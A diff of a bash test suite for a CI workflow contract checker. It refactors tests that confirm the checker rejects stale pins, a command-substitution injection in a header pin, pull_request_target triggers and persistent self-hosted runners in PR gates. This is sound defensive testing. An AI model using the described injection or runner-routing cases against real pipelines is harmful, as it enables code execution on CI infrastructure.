 
 # Every member of the set, not just the one that motivated the check. A member
@@ -7505,11 +7469,9 @@ bash "$gen" release-artifact "$sha" --build-runner ubuntu-24.04 \
   >"$custom_modes/.github/workflows/release.yml"
 bash "$gen" pr-gate "$sha" --untrusted-runner linux-x64 \
   >"$custom_modes/.github/workflows/changelog-contract.yml"
-sync_last_rejection
 grep -qF -- '--build-runner ubuntu-24.04' "$custom_modes/.github/workflows/release.yml" \
   && pass "custom release-artifact fixture records its build-runner option" \
   || fail "custom release-artifact fixture lost its build-runner option"
-sync_last_rejection
 grep -qF 'runs-on: [linux-x64]' "$custom_modes/.github/workflows/changelog-contract.yml" \
   && pass "custom pr-gate fixture records its untrusted-runner option" \
   || fail "custom pr-gate fixture lost its untrusted-runner option"
@@ -7631,15 +7593,17 @@ two_stale="$tmproot/adopter-two-stale-members"
 build_adopter "$two_stale"
 stale_pin "$two_stale" scripts/render-next.sh
 stale_pin "$two_stale" .github/workflows/changelog-contract.yml
-if run_adopter "$two_stale"; then
+schedule_adopter_script "$two_stale" "$(cat <<'SCHED_SCRIPT'
+if [ "$status" -eq 0 ]; then
   fail "emitted suite accepted two members left at an earlier contract commit"
 else
-sync_last_rejection
-  { grep -qF 'scripts/render-next.sh is still at' "$tmproot/run.out" \
-    && grep -qF '.github/workflows/changelog-contract.yml is still at' "$tmproot/run.out"; } \
+  { grep -qF 'scripts/render-next.sh is still at' "$ADOPTER_LOG" \
+    && grep -qF '.github/workflows/changelog-contract.yml is still at' "$ADOPTER_LOG"; } \
     && pass "a subset regeneration names every divergent member, not just the first" \
-    || fail "only one divergent member was named: $(tr '\n' ' ' <"$tmproot/run.out" | tail -c 400)"
+    || fail "only one divergent member was named: $(tr '\n' ' ' <"$ADOPTER_LOG" | tail -c 400)"
 fi
+SCHED_SCRIPT
+)"
 
 # --------------------------------------------------------------------------
 # Divergence is reported on positive evidence, never inferred from a quiet scan
@@ -7867,11 +7831,9 @@ else:
 open(path, "w", encoding="utf-8").writelines(lines)
 INJECT
 schedule_adopter_script "$injection_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepted a header whose pin is a command substitution"
-else
-  pass "emitted suite refuses a header whose pin is a command substitution"
-fi
+expect_scheduled_rejection 'scripts/render-next.sh declares no contract pin this suite can read' \
+  "emitted suite refuses a header whose pin is a command substitution" \
+  "emitted suite accepted a header whose pin is a command substitution"
 SCHED_SCRIPT
 )"
 [ ! -e "$injection_witness" ] \
@@ -7918,24 +7880,24 @@ pr_gate_unaccepted_runner() { # <dir>: header and body agree on a runner pr-gate
     -e 's/^    runs-on: \[self-hosted, isolated\]$/    runs-on: [Self-Hosted, isolated]/' \
     "$1/.github/workflows/changelog-contract.yml"
 }
-expect_rejection "a PR gate whose header and body agree on a runner pr-gate refuses" pr_gate_unaccepted_runner
-expect_rejection "a second PR gate job that routes through a reusable workflow" pr_gate_reusable_job
-expect_rejection "a second PR gate job whose runs-on key is a YAML escape" pr_gate_escaped_key_job
-expect_rejection "a PR gate trigger changed to pull_request_target" pr_gate_target_trigger
-expect_rejection "a persistent self-hosted runs-on hand-edited under a bare PR gate header" \
+expect_rejection --reason "records an --untrusted-runner value pr-gate does not accept" "a PR gate whose header and body agree on a runner pr-gate refuses" pr_gate_unaccepted_runner
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a second PR gate job that routes through a reusable workflow" pr_gate_reusable_job
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a second PR gate job whose runs-on key is a YAML escape" pr_gate_escaped_key_job
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a PR gate trigger changed to pull_request_target" pr_gate_target_trigger
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a persistent self-hosted runs-on hand-edited under a bare PR gate header" \
   pr_gate_runs_on '[self-hosted, general]'
 # A self-hosted runner can carry any label, so one that merely starts with the
 # hosted image name is not the hosted image.
-expect_rejection "a PR gate runs-on that only begins with the hosted image name" \
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a PR gate runs-on that only begins with the hosted image name" \
   pr_gate_runs_on ubuntu-24.04-persistent
-expect_rejection "a PR gate header recording --untrusted-runner over the default runs-on" \
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a PR gate header recording --untrusted-runner over the default runs-on" \
   pr_gate_record_runner self-hosted,isolated
-expect_rejection "a recorded --untrusted-runner whose PR gate body names other labels" \
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a recorded --untrusted-runner whose PR gate body names other labels" \
   pr_gate_regenerate_then_runs_on self-hosted,isolated '[self-hosted, general]'
-expect_rejection "a recorded --untrusted-runner whose PR gate body reorders the labels" \
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a recorded --untrusted-runner whose PR gate body reorders the labels" \
   pr_gate_regenerate_then_runs_on self-hosted,isolated '[isolated, self-hosted]'
-expect_rejection "a second PR gate job routed to a persistent runner" pr_gate_second_job
-expect_rejection "a YAML merge key in the PR gate" pr_gate_merge_key
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a second PR gate job routed to a persistent runner" pr_gate_second_job
+expect_rejection --reason "differs from the PR gate pr-gate writes" "a YAML merge key in the PR gate" pr_gate_merge_key
 
 isolated_gate_adopter="$tmproot/adopter-isolated-pr-gate"
 build_adopter "$isolated_gate_adopter"
